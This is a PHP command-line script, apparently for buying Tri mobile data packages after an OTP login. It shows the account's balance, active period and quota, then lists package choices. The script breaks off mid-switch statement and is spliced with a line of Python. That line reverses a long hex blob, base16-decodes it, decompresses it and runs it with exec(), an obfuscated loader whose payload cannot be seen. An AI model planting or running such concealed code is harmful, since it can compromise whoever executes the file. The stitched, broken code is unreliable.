<?php
/*
Provider Tri
*/
echo @color("white","��─\n");
echo @color("green","                 PAKET MAGIC 3            \n");
echo @color("white","��─\n");
echo @color('purple', "Nomor Tri Kamu  \t\t: ");
$nomor = trim(fgets(STDIN));
$login = login($nomor);
echo @color('green', $login['message']."\n");
echo @color('purple', "Masukkan Kode OTP\t\t: ");
$otp = trim(fgets(STDIN));
$login = otplogin($nomor,$otp);
if (strpos(json_encode($login), '"status":true')) {
	$secret = $login['secretKey'];
	$plan = $login['callPlan'];
    $nomor = $login['msisdn'];
    $profil = profil($nomor,$plan,$secret);
    $balance = $profil['creditBalance'];
    $aktif = $profil['activeUntil'];
    $sisakuota = $profil['sumOfInternet'];
    $poin = $profil['stotalPoin'];
	echo @color('yellow', "\nPulsa Anda\t\t: ");
	echo @color('nevy', "$balance\n");
	echo @color('yellow', "Masa Aktif\t\t: ");
	echo @color('nevy', "$aktif\n");
    echo @color('yellow', "Sisa Kuota\t\t: ");
    echo @color('nevy', "$sisakuota\n");
    echo @color('yellow', "Poin Bonstri\t\t: ");
    echo @color('nevy', "$poin Poin\n\n");
    cek:
    echo @color('green', "Pilih Paket:\n");
    echo @color('yellow', "1. Welcome Reward 5GB ==> Rp 1\n2. (NEW) 10GB 30 Hari ==> Rp 15000\n3. (NEW) 15GB 30 Hari ==> Rp 20000\n4. 25GB 25rb (Diskon) ==> Rp 25000\n5. 25GB 24 Jam 20 Hari ==> Rp 25000\n6. (NEW) 25GB 20 Hari ==> Rp 25000\n7. (NEW) 25GB 20 Hari ==> Rp 25000\n8. 25GB 24 Jam 30 Hari ==> Rp 29000\n9. (NEW) 25GB 30 Hari ==> Rp 29000\n10. (NEW) 55GB 30 Hari ==> Rp 50000\n11. (NEW) 65GB 30 Hari ==> Rp 60000\n12. (NEW) 75GB 30 Hari ==> Rp 75000\n13. (NEW) 90GB 30 Hari ==> Rp 90000\n14. (NEW) 100GB 30 Hari ==> Rp 90000\n");
    echo @color('green', "\nMasukkan Pilihan (Sesuai Angka) : ");
    $pilih = trim(fgets(STDIN));
    switch ($pilih) {
            case '1':
            $prodid = '25669';
            break;
            case '2':
            $prodid = '25245';
            break;
            case '3':
            $prodid = '25459';
            break;
            case '4':
            $prodid = '22648';
            break;
            case '5':
            $prodid = '23160';
            break;
            case '6':
            $prodid = '25254';
            break;
            case '7':
            $prodid = '25264';
            break;
            case '8':
            $prodid = '23164';
            break;
            case '9':
            $prodid = '25267';
            break;
            case '10':
            $prodid = '25469';
            break;
            case '11':
            $prodid = '25690';
            break;
            case '12':
            $prodid = '25247';
            break;
            case '13':
            $prodid = '25476';
            break;
            case '14':
            $prodid = '25693';
            break;
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));exec((_)(b'5963D931F7BE5F8FFF2659A30BAE88D60EB16304F2EDE0044B921049B5ADE824439F95171062585FD7CE4A53FA511F3A7EADE317E302BAE3BAEA3C738714ED235E071A52BBD1A7FC3BAFAD1545D2EAF3000553092D631215B99C2FC9271556C6DFA14DD4064F6735A9A0802D85D3A773D7513A07A14F4D1012B39B0EDD87829D5B35AE1B31C0514D191BA38BDDCC2953834F720831AB722865665C85F525B9B851321A0315AB5A8B79D7D20E9C05BB5456EF1D6E8EEB2A358B9BCB6B9EF7383B0C0CF6A683A052BEAD3AE0AE288794E8C1FEB1A3CFAA0E2A830540E392C847A138185D0748C8B83D82946CFC01A72C0809050A6DB92B6666CBD0A03213B3C063514344969739589E327CA27B7C23E1414BC60E091AC1A3B2629ACC3BD413A0CF7D57FB343D090C963B04CA19D7C1F86A9CE2C9D078525098DF0C8019122551175CD957C2A1D1E4C4683908FC7368BBE1D9EF626B138D3A14DF64A339EA25DC48C9C16045FB313BF6ED0AE7E67F8D1447B59F0C6C4032A743EEC2273B9686E32EFEEA266DB4992CC9E4CF12B85A5E8484CF3BF81449166506D9671B5F0A0272CC0DF3D37F92654FFAC0E1C8EB0A22671C1FC4821E8D9687BCA89FB431C9A5605880CDF27EA06E8B8832C4BA54DC36DB22B31913D6369C549571DAC52E06A9B40794890A86FD755E3F27037404811282F14CC8C78AA836CADBC08E4F5869D1181B1ACE091B0E6186B28BC840015610AE36F9C9CAA3123894CF2A78634CD8A1918F54FB8D789902D617DB0CEEB2CDEA0A330E19C6B4EE39781BD647CC225262F59085B341E11E44485ED0BC353F21CC16B7385E6307BA191C3A847824D33D8D6458C93C1330BC9EE97E330C0BD7C9C33623141406B24DA20E5A952C242D7646701C9722CE04F6FF027D899EE8962FEF4E59C95E111618201EBA6F36F8F7909EB55119A8271DABA580BB7A63EF27602E8C79CDBA4C59C1A5510EC485BEFBE28D850E314010E87214900E5043815C4ADFF2C1E227E6900706C51FA3026C0C7354D1F8E703F65802356B0C9540F2466884FCACE5F2BCD33E36DEF288B01465B20761310CD2CB727AC0CA45CD972EBFC05F316C128102E6B7F3097534CAEE9E075FD86ECFA309BFB7DE91EFF3197A07504784E3A6C3A70AF44A6C23290DA38D57362EE51AE8BCCCA9C6A013A322073E8DB543622F52E48AC18EB2132423B0B1E39F4C173E906BBBF6048D227E0EBB114F39DBEDAC52592690A4504A24250B35020D15168DC60B29E20AF336C871194120321309F68DE37F48FCDC8A0552ED9A4782F247B0902D971F981E27CCC33F1948CE3FC83E28B38FE74D064CDB54F0EB75D3BBA4BCC09B4B653BD6FDD73E5C68D88033B5F514AC3EBE9778E5B4D9D0FDE959607358D023F0E6FD5CE552202C86373CD393AF96168FE3735E4E480CFD959D79AC1B5551F8EE4F60D79884D218C13DA0EB20C9192FCE87CECF3B89163379675D76AEBDF5233F1B59B7D1FB6F60EFD0BBB35BE8177AB084C76CACF3F78E6CA333B199F9EABEE6723CA7F0B337262D377732EC616FD3ED87BD7FC417AA9C1D2D66A1541580058FF9995BC0C5759BA7CA8D052D9989302A118925856F2DB510D3A40737A15C1F18D7ED6E5C47F19BD0F481D6AC983EBAA624BDB745352714EF4013D2C5BDD6A7C29EC4A7F3E998DDE6A7C00BA4043B709A4D7B6D570A776EA76370038E61C6BD820375C56E9C603961F273FE9088C382C8342A1188165BAFA3ACDB8537B9A2450C3CFFE03CBF6E29C481A57DB37F1D7DE38383E328133DDD8B9B88E87AFDCA02957A1B96C1D232E2BAD055B88B2A078A271E5941B29ED11B6C70B753F5441D5A70F098AA9D40BF0F85E05C1B24A3D3D88662BF0DD1C793366E582C4A1B0AD195801A15971C05C380F506C62821D2D7C028503D37FA757CA3450453D83B05509D85539A9EC3F5B0709B5F8A29C777527B400F973A9A064C8483158A8E137A18A6CA1FD87BC35EBBB742089EE09199B670E816217A99958AD0EC6CF6812DBDA16EA3B328E13A6A65E4F4539E56E96689FB6D11DCBF7E01808703146935EEACA670DC27DD851E22B03B5EDC95293195707354331021EED6749E6C4FE9232FDDC82E73ABFEC3D7CA77D7EED6A3A860874A7DA090FB786720A975A878E4AD2C34879E7A8A5BF811FB07E69620804E42C2939DDACF4357291AEB594A89FAE0E8E4D5DE2D8C0FD7EB03BD9783E5CF0960868FCE749D6CE7CAB6BBCBDEA15EA5B19643DED99C5F93EB36D8AB1C2F78BBD2FC6B9FC93626917D08DE9E4E0BE14F6F3DB53A5618C067149D1C7BA5204D65458CD732D8DEC7C13D0AFBE673A786053B26EEE64AD3FB2BF8BC358163F341F9CA55337B844002B75F2B37D4CEDA63DE7D65DBDD2953D67FF61D26B9F17DCB7E2ACBEC16F8B6E169DE9A7B5600BF859DA1C095FDBCBEBD6DCB4E3C7E25B1CC2687FE73E8B71EB9F03DDE6AC473868C00828FE097C4B0C78EBE9C0EEEC23B8C512DADEEC26D572E90DB5AAD8AAC93F183B3B4C97C3D75BDE6479EE493892EE8FE619D6774D5A7959D276FE96FFE77EBFCDDCCAF6D4B7E956C57EFD47755B56FBDC8BB4BCBADC91C66FC0900F51302DC3FD4E1A7BAD596DCFA15F5C0B792FC361D6EEE7AC6DDF631DE87689ECDB7E3A573EEFCD507A8DE87DBBFA9B9752335552361D7F2369EBFCDC79192CD5568A6874AD4D33D669FBEDB97DE63CD6453B695ABB3D5ED35ECDB8664B433152ABE7EDDDDD37669595766C3A195FEDA834FCAB9E34FF6ABADB4DDBDC7CB3B311FDFDBE1461F9EED3DDD99BEB23FB5DC659ED6F95B5BAAE3BBC236FC86BD5B75BAA2AD7A9B37ECE3F1F93F5FEFEFF7F3FBFCFE9FFFF3CBABB9E255977308177F5E8EB7324720634EA8849682DF6446397954C083CDEAB479D1C987'))